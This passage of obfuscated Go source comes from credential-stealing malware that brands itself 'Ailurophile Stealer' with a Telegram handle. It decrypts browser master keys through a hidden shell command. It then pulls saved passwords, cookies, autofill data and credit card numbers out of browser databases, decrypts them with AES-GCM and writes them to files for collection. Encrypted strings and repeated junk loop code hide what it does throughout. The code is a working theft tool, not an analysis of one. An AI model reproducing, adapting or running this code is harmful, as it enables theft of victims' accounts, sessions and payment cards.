				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	psCommand := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("e9211b73c3c8b1a835a9831808858ca92efd7d00119642e5eb6ef02175ccf0d41a9c5fd1b76739478537253ab17fbcfbfb29c8c240e308a2a488de27e161dbaf111f43a7f1f421a71231857160d4927c47fd8bcf2de3eb8624872863cdd1a1e1b497b3337045f5a1002a8b80a4e7517c100e755d0ab2ac7d9600de73e03a7e259b77d66de15bdd21a62bfef82e75ec36ea35ca2137a7ff1bd6f6ce77f836c24c37304c8b75ccf47f0ebec583fdf6701dca731a353308261e1eaafadab25bff1e5454d3cdc098e12dea983e7d21e991123dc7e6976c81679f4d43c5d08f9ac18bdc90aadab1aaa7406a3ec9162982e8288967ea1c110017959f4b4540bc8d4c663dd9c588223582cb77eaf1c80b068d863196e2e3145dc8520441743734503c8465f16ca6d5085a2904f873df1ca23babe23d23adc2fd3f2e74844a56b6791907bff56fd94922bb5bb6a355985ce7bb063542817931"), hexString)
	cmd := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("930f08729cefa0bd3ce5aa34d5368f13166a0f402943e6aeaf4b"), Cijosgmviuhoepbatohaaytukfezbopl("ce23107a83fda6bc495a19ac3d936b6eedc4927b79d6741e"), psCommand)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("86120d789cbcada035eadb2d12988ee41cfe732b02a84fa0a551a9316ec4f09b279d0684e07d477ac2786459f968e3b8ac238c44f47049ce37729fc52331fc7f41b6"), err, stderr.String())
	}
	return strings.TrimSpace(out.String()), nil
}
func aqjgdernyxyswtnenuzltkaebkodwziz(browserPaths *[][]string) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	for i := range *browserPaths {
		path := (*browserPaths)[i]

		if _, err := os.Stat(path[0]); os.IsNotExist(err) {
			continue
		}

		localStatePath := filepath.Join(path[2], Cijosgmviuhoepbatohaaytukfezbopl("af0f1c7682bc9bac31fdcb648c250bfe6af3db71483a2a7fbe4257"))
		if _, err := os.Stat(localStatePath); os.IsNotExist(err) {
			continue
		}

		localStateContent, err := os.ReadFile(localStatePath)
		if err != nil {
			continue
		}
		var localStateJson map[string]interface{}
		if err := json.Unmarshal(localStateContent, &localStateJson); err != nil {
			continue
		}
		osCrypt, ok := localStateJson["os_crypt"].(map[string]interface{})
		if !ok || osCrypt["encrypted_key"] == nil {
			continue
		}
		encryptedKeyBase64 := osCrypt["encrypted_key"].(string)
		encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyBase64)
		if err != nil {
			continue
		}
		encryptedKey = encryptedKey[5:]
		hexArray := make([]string, len(encryptedKey))
		for i, b := range encryptedKey {
			hexArray[i] = fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c6048926ffdb7073200fb83f28430ba28df5"), b)
		}
		hexString := strings.Join(hexArray, Cijosgmviuhoepbatohaaytukfezbopl("cfeb2d771341be574ee04e20a0a78bf9ad"))
		decryptedKey, err := bzslcmrplacwbqjtswbnkdimofgxiiib(hexString)
		if err != nil {
			continue
		}
		(*browserPaths)[i] = append((*browserPaths)[i], decryptedKey)
	}
}
func tucygvoukqyipbfoqjkxjtnfgftmjcas(path string) string {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	if strings.Contains(path, Cijosgmviuhoepbatohaaytukfezbopl("af0f1c76824c2c60b758383ff55916ba40691bebda")) {
		return strings.Split(strings.Split(path, Cijosgmviuhoepbatohaaytukfezbopl("bf2c10748ff094bf295391bceae39186b5e7f122025645"))[1], Cijosgmviuhoepbatohaaytukfezbopl("bf22004594e507396b31e4be08d7d1172a"))[0]
	}
	return strings.Split(strings.Split(path, Cijosgmviuhoepbatohaaytukfezbopl("bf32107683f5a6bf0c2d4e93f7ee6a94d35a62080b80be38b7"))[1], Cijosgmviuhoepbatohaaytukfezbopl("bf22004594e507396b31e4be08d7d1172a"))[0]
}
func mcpdvxagecmegmpgzuzurcdsxthgisse(browserPaths [][]string, mainFolderPath string) int {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	userCopyright := Cijosgmviuhoepbatohaaytukfezbopl("a20913629cf3b8b039e5cb7928828ca520f4766e5ddb73a0a558ee2060c4a7da09b855c8b07c224ecf656955e375d392e79aecf04da038a2b462a034f0d46c40")
	var autofillData []string
	for _, pathData := range browserPaths {
		path := pathData[0]
		applicationName := Cijosgmviuhoepbatohaaytukfezbopl("56c839d8af0b49bca46006468ee9a099")
		if strings.Contains(path, Cijosgmviuhoepbatohaaytukfezbopl("af0f1c76824c2c60b758383ff55916ba40691bebda")) {
			applicationName = strings.Split(strings.Split(path, Cijosgmviuhoepbatohaaytukfezbopl("bf2c10748ff094bf295391bceae39186b5e7f122025645"))[1], Cijosgmviuhoepbatohaaytukfezbopl("bf22004594e507396b31e4be08d7d1172a"))[0]
		} else if strings.Contains(path, Cijosgmviuhoepbatohaaytukfezbopl("b10f1e7a87f2af544551158ea35cca9a763220b5908244")) {
			applicationName = strings.Split(strings.Split(path, Cijosgmviuhoepbatohaaytukfezbopl("bf32107683f5a6bf0c2d4e93f7ee6a94d35a62080b80be38b7"))[1], Cijosgmviuhoepbatohaaytukfezbopl("bf22004594e507396b31e4be08d7d1172a"))[0]
		}
		webDataPath := filepath.Join(path, Cijosgmviuhoepbatohaaytukfezbopl("b4051d37aafdbcb932250f7b186950276bab95d84f48163c"))
		webDataDBPath := filepath.Join(path, Cijosgmviuhoepbatohaaytukfezbopl("94051d738fe8a9f634eb3329d0568a6eb4d6d88c262feb97c16b"))

		if _, err := os.Stat(webDataPath); os.IsNotExist(err) {
			continue
		}
		if err := vmkqmfmumrbafwxzglhqlqoflbfgmyia(webDataPath, webDataDBPath); err != nil {
			continue
		}
		db, err := sql.Open(Cijosgmviuhoepbatohaaytukfezbopl("9011137e9af9fb194292514bf04fc6c9d2d5efcf86a86c"), webDataDBPath)
		if err != nil {
			continue
		}
		defer db.Close()
		query := Cijosgmviuhoepbatohaaytukfezbopl("b0253352adc8e8b631e4cb755b8088a839f4240822b46ae5a848fd3d67c0f19699ff9583b5709d40cbf33bf8d653050f")
		rows, err := db.Query(query)
		if err != nil {
			continue
		}
		defer rows.Close()
		for rows.Next() {
			var name, value string
			if err := rows.Scan(&name, &value); err != nil {
				continue
			}
			autofillData = append(autofillData, fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("de5d422ad3a1f5e56db4936446cbd4f946df652315c107e0ba37df336ddcf8c069dc4fae847e3d52ce6f6444fc74b7a2a975cb9600f4491fdff9daffbc3095c84ece9698e15a41"), name, value, applicationName, pathData[1]))
		}

		if len(autofillData) == 0 {
			autofillData = append(autofillData, fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("ad0f5f769be8a7be39e5c22a5b9086b122f524281f8907e0ba1dac210b116cd8de50944c5314d195b9e5bbdcfd"), applicationName, pathData[1]))
		}
	}

	if len(autofillData) > 0 {
		autofillsFolderPath := filepath.Join(mainFolderPath, Cijosgmviuhoepbatohaaytukfezbopl("a2150b7888f5a4b423d3af1a480a9ebccc25147d90ce3f2b4e"))
		autofillsFilePath := filepath.Join(autofillsFolderPath, Cijosgmviuhoepbatohaaytukfezbopl("a2150b7888f5a4b423a7da210fb6c6999286962ab643c32a41f6219d82"))
		if _, err := os.Stat(autofillsFilePath); err == nil {
			if err := os.Remove(autofillsFilePath); err != nil {
				return len(autofillData)
			}
		}
		if _, err := os.Stat(autofillsFolderPath); os.IsNotExist(err) {
			if err := os.MkdirAll(autofillsFolderPath, 0777); err != nil {
				return len(autofillData)
			}
		}
		if err := os.WriteFile(autofillsFilePath, []byte(userCopyright+strings.Join(autofillData, Cijosgmviuhoepbatohaaytukfezbopl("56c839d8af0b49bca46006468ee9a099"))), 0644); err != nil {
		}
	}

	return len(autofillData)
}
func mtucyzqazbjoxtjtjjqakixjnxvxcpbw(browserPaths [][]string, mainFolderPath string) int {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	cookiesData := make(map[string][]string)
	cookiesData["banner"] = []string{"Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"}
	totalCookies := 0

	for _, path := range browserPaths {
		networkPath := filepath.Join(path[0], Cijosgmviuhoepbatohaaytukfezbopl("ad050b6081eea3d9d6150b9bc937776013ec745e77d1b8"))

		if _, err := os.Stat(filepath.Join(networkPath, Cijosgmviuhoepbatohaaytukfezbopl("a00f107c87f9bb13277b6feec24a76ca3b027fb39d9a97"))); os.IsNotExist(err) {
			continue
		}

		var browserFolder string
		if strings.Contains(path[0], Cijosgmviuhoepbatohaaytukfezbopl("af0f1c76824c2c60b758383ff55916ba40691bebda")) {
			browserFolder = strings.Split(strings.Split(path[0], Cijosgmviuhoepbatohaaytukfezbopl("bf2c10748ff094bf295391bceae39186b5e7f122025645"))[1], Cijosgmviuhoepbatohaaytukfezbopl("bf22004594e507396b31e4be08d7d1172a"))[0]
		} else {
			browserFolder = strings.Split(strings.Split(path[0], Cijosgmviuhoepbatohaaytukfezbopl("bf32107683f5a6bf0c2d4e93f7ee6a94d35a62080b80be38b7"))[1], Cijosgmviuhoepbatohaaytukfezbopl("bf22004594e507396b31e4be08d7d1172a"))[0]
		}

		cookiesPath := filepath.Join(networkPath, Cijosgmviuhoepbatohaaytukfezbopl("a00f107c87f9bb13277b6feec24a76ca3b027fb39d9a97"))
		db, err := sql.Open(Cijosgmviuhoepbatohaaytukfezbopl("9011137e9af9fb194292514bf04fc6c9d2d5efcf86a86c"), cookiesPath)
		if err != nil {
			continue
		}
		defer db.Close()

		query := Cijosgmviuhoepbatohaaytukfezbopl("b0253352adc8e8b03ffada06109390e86cff652315d707a0a75efb2b71ddf89e168f5dc8b06b6d78f5434810f674b6f3e035cbc1941da3ad3b14d74d0607634cab5693")
		rows, err := db.Query(query)
		if err != nil {
			continue
		}
		defer rows.Close()

		for rows.Next() {
			var hostKey, name string
			var encryptedValue []byte
			if err := rows.Scan(&hostKey, &name, &encryptedValue); err != nil {
				continue
			}

			if len(encryptedValue) < 31 {
				continue
			}

			iv := encryptedValue[3:15]
			encryptedData := encryptedValue[15 : len(encryptedValue)-16]
			authTag := encryptedValue[len(encryptedValue)-16:]

			var decrypted string
			if len(path) > 3 && path[3] != "" {
				key, err := hex.DecodeString(path[3])
				if err != nil {
					continue
				}

				block, err := aes.NewCipher(key)
				if err != nil {
					continue
				}

				aesgcm, err := cipher.NewGCM(block)
				if err != nil {
					continue
				}

				plaintext, err := aesgcm.Open(nil, iv, append(encryptedData, authTag...), nil)
				if err != nil {
					continue
				}
				decrypted = string(plaintext)
			} else {
				continue
			}

			cookieKey := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c61320329d8cf0ad35b23f4388970473b0fcdb7fff"), browserFolder, path[1])
			cookiesData[cookieKey] = append(cookiesData[cookieKey], fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c6137643bcc98dd17f80e81837a5accd7ea43d7945cc14f1fc0b807772a0b88943f3d175eccff0e8d6e4c067759d96d96597"), hostKey, name, decrypted))
			totalCookies++
		}
	}

	for browserName, cookies := range cookiesData {
		if strings.ToLower(browserName) == "banner" {
			continue
		}

		if len(cookies) > 0 {
			cookiesContent := strings.Join(cookies, Cijosgmviuhoepbatohaaytukfezbopl("56c839d8af0b49bca46006468ee9a099"))
			cookiesWithBanner := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("a20913629cf3b8b039e5cb7928828ca520f4766e5ddb73a0a558ee2060c4a7da09b855c8b07c224ecf656955e375d392ac23dce0ba7c827ea86240f583ec02102258"), cookiesContent)
			fileName := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c613516396e83f5b22bba7f2f5a14eda2850d614dbc1"), browserName)

			cookiesFolderPath := filepath.Join(mainFolderPath, Cijosgmviuhoepbatohaaytukfezbopl("a00f107c87f9bb13277b6feec24a76ca3b027fb39d9a97"))
			cookiesFilePath := filepath.Join(cookiesFolderPath, fileName)

			if _, err := os.Stat(cookiesFolderPath); os.IsNotExist(err) {
				if err := os.MkdirAll(cookiesFolderPath, 0777); err != nil {
					continue
				}
			}

			if err := os.WriteFile(cookiesFilePath, []byte(cookiesWithBanner), 0644); err != nil {
				continue
			}
		}
	}

	return totalCookies
}
func awawpjkicefmzgjthatjrdlkzuyidhmc(browserPaths [][]string, mainFolderPath string) int {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	totalPasswords := 0

	for _, path := range browserPaths {
		passwords := []string{}

		if _, err := os.Stat(path[0]); os.IsNotExist(err) {
			continue
		}

		var appName string
		if strings.Contains(path[0], Cijosgmviuhoepbatohaaytukfezbopl("af0f1c76824c2c60b758383ff55916ba40691bebda")) {
			appName = strings.Split(strings.Split(path[0], Cijosgmviuhoepbatohaaytukfezbopl("bf2c10748ff094bf295391bceae39186b5e7f122025645"))[1], Cijosgmviuhoepbatohaaytukfezbopl("bf22004594e507396b31e4be08d7d1172a"))[0]
		} else {
			appName = strings.Split(strings.Split(path[0], Cijosgmviuhoepbatohaaytukfezbopl("bf32107683f5a6bf0c2d4e93f7ee6a94d35a62080b80be38b7"))[1], Cijosgmviuhoepbatohaaytukfezbopl("bf22004594e507396b31e4be08d7d1172a"))[1]
		}

		loginDataPath := filepath.Join(path[0], Cijosgmviuhoepbatohaaytukfezbopl("af0f187e80bc8cb924e846951aae7327177f714383b6725cbd7f"))
		passwordsDbPath := filepath.Join(path[0], Cijosgmviuhoepbatohaaytukfezbopl("93010c6499f3babc23a7ca3bb22843fa773199998d5457026e4756a9"))

		if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
			continue
		}

		if err := vmkqmfmumrbafwxzglhqlqoflbfgmyia(loginDataPath, passwordsDbPath); err != nil {
			continue
		}

		db, err := sql.Open(Cijosgmviuhoepbatohaaytukfezbopl("9011137e9af9fb194292514bf04fc6c9d2d5efcf86a86c"), passwordsDbPath)
		if err != nil {
			continue
		}
		defer db.Close()

		query := Cijosgmviuhoepbatohaaytukfezbopl("b0253352adc8e8b722e0c93015a99cb620bd243b039e55aba850ec0d77c8f18f2cd51cd4a47d3e49c87e616fe37ab5edec7c98d244f32698beda8666ce57c6fc232861c482fd2db50936823da9d2068ec93f00ef804158c89d5681")
		rows, err := db.Query(query)
		if err != nil {
			continue
		}
		defer rows.Close()

		for rows.Next() {
			var originURL, usernameValue string
			var passwordValue []byte
			var dateCreated int64

			if err := rows.Scan(&originURL, &usernameValue, &passwordValue, &dateCreated); err != nil {
				continue
			}

			if usernameValue == "" {
				continue
			}

			if len(passwordValue) < 31 {
				continue
			}

			iv := passwordValue[3:15]
			encryptedData := passwordValue[15 : len(passwordValue)-16]
			authTag := passwordValue[len(passwordValue)-16:]

			var decrypted string
			if len(path) > 3 && path[3] != "" {
				key, err := hex.DecodeString(path[3])
				if err != nil {
					continue
				}

				block, err := aes.NewCipher(key)
				if err != nil {
					continue
				}

				aesgcm, err := cipher.NewGCM(block)
				if err != nil {
					continue
				}

				plaintext, err := aesgcm.Open(nil, iv, append(encryptedData, authTag...), nil)
				if err != nil {
					continue
				}
				decrypted = string(plaintext)
			} else {
				continue
			}

			date := time.Unix((dateCreated/1000000)-11644473600, 0).Format(Cijosgmviuhoepbatohaaytukfezbopl("d1504f21c3acf9f560bb8e684eccd9f076a131b86544112e738f1ffe26fd8a456795e5"))
			passwords = append(passwords, fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("de5d422ad3a1f5e56db4936446cbd4f946c456024adb02b6c368fa3773c7fc972cc31c81b6041d5fd47f725fe77fe3b8ac23b2f244f326e79eda8666ce57c6e6455f5d83e3e132be093b907c27f88e3f17ac97887af191dc11d8f3fd471cea7c6342268c1c872c"), originURL, usernameValue, decrypted, date, appName, path[1]))
			totalPasswords++
		}

		if len(passwords) == 0 {
			passwords = append(passwords, Cijosgmviuhoepbatohaaytukfezbopl("ad0f5f678fefbbaf3ffbca791d999caa2840092bc5defb81f05c52f050c6dc08b3"))
		}

		if len(passwords) > 0 {
			passwordsFolderPath := filepath.Join(mainFolderPath, Cijosgmviuhoepbatohaaytukfezbopl("b3010c6499f3babc23fe249ffc9e803f15b5b140894c44eb96"))
			nameFile := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c61352329db2bca024f5ef690ef6ba88d39385cb205875d1f8"), appName, path[1])

			if _, err := os.Stat(passwordsFolderPath); os.IsNotExist(err) {
				if err := os.MkdirAll(passwordsFolderPath, 0777); err != nil {
					continue
				}
			}

			passwordsFilePath := filepath.Join(passwordsFolderPath, nameFile)
			if _, err := os.Stat(passwordsFilePath); err == nil {
				if err := os.Remove(passwordsFilePath); err != nil {
					continue
				}
			}

			if err := os.WriteFile(passwordsFilePath, []byte("Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"+strings.Join(passwords, Cijosgmviuhoepbatohaaytukfezbopl("56c839d8af0b49bca46006468ee9a099"))), 0644); err != nil {
				continue
			}
		}
	}

	return totalPasswords
}
func jbnekrkysmdedjzgsqdyfboegudmojxn(browserPaths [][]string, mainFolderPath string) int {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	var cards []string
	totalCardsFound := 0

	for _, path := range browserPaths {
		if _, err := os.Stat(path[0]); os.IsNotExist(err) {
			continue
		}
		webDataPath := filepath.Join(path[0], Cijosgmviuhoepbatohaaytukfezbopl("b4051d37aafdbcb932250f7b186950276bab95d84f48163c"))
		copiedFilePath := filepath.Join(path[0], Cijosgmviuhoepbatohaaytukfezbopl("b4051d398afe8e3c461cbe60637ebac3e8d624621220"))

		if _, err := os.Stat(webDataPath); os.IsNotExist(err) {
			continue
		}

		key, err := hex.DecodeString(path[3])
		if err != nil {
			continue
		}

		if err := vmkqmfmumrbafwxzglhqlqoflbfgmyia(webDataPath, copiedFilePath); err != nil {
			continue
		}

		db, err := sql.Open(Cijosgmviuhoepbatohaaytukfezbopl("9011137e9af9fb194292514bf04fc6c9d2d5efcf86a86c"), copiedFilePath)
		if err != nil {
			continue
		}
		defer db.Close()

		query := Cijosgmviuhoepbatohaaytukfezbopl("b0253352adc8e8bb31fbca06158384a629e35b2b1e9855bcb949ec362d89f88239904ec5b1672250f8756051e737f9fdf120d1c444f32aa8b3f78e68d446caf045144fe4c7ce2dbc3f3b907a2ab7a65778c4c4cb2de7ff8729f61b70d0c1b71017490207978e75fdf3eb332560ff3d")
		rows, err := db.Query(query)
		if err != nil {
			continue
		}
		defer rows.Close()

		for rows.Next() {
			var cardNumberEncrypted []byte
			var expirationYear, expirationMonth int
			var nameOnCard string

			if err := rows.Scan(&cardNumberEncrypted, &expirationYear, &expirationMonth, &nameOnCard); err != nil {
				continue
			}

			month := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c6504d73d5f6355f2eed65c7182837bda65bec85"), expirationMonth)
			iv := cardNumberEncrypted[3:15]
			encryptedData := cardNumberEncrypted[15 : len(cardNumberEncrypted)-16]
			authTag := cardNumberEncrypted[len(cardNumberEncrypted)-16:]

			block, err := aes.NewCipher(key)
			if err != nil {
				continue
			}

			aesgcm, err := cipher.NewGCM(block)
			if err != nil {
				continue
			}

			decryptedCardNumber, err := aesgcm.Open(nil, iv, append(encryptedData, authTag...), nil)
			if err != nil {
				continue
			}

			cardInfo := fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("c61376329db3edbc59acdd53f0adf77e313d190a3c2fa7506d56d598"), string(decryptedCardNumber), month, expirationYear, nameOnCard)
			cards = append(cards, cardInfo)
			totalCardsFound++
		}

		if err := os.Remove(copiedFilePath); err != nil {
		}
	}

	if len(cards) == 0 {
		cards = append(cards, Cijosgmviuhoepbatohaaytukfezbopl("ad0f5f748feeacab70efc12c1592f3d8331a588373a1a78c5f8980d9a73f"))
	}

	if len(cards) > 0 {
		cardsFolderPath := filepath.Join(mainFolderPath, Cijosgmviuhoepbatohaaytukfezbopl("a0010d739d4cfe50b28e04f598d7f57b3e11b8e120"))
		if _, err := os.Stat(cardsFolderPath); os.IsNotExist(err) {
			if err := os.MkdirAll(cardsFolderPath, 0777); err != nil {
				return totalCardsFound
			}
		}

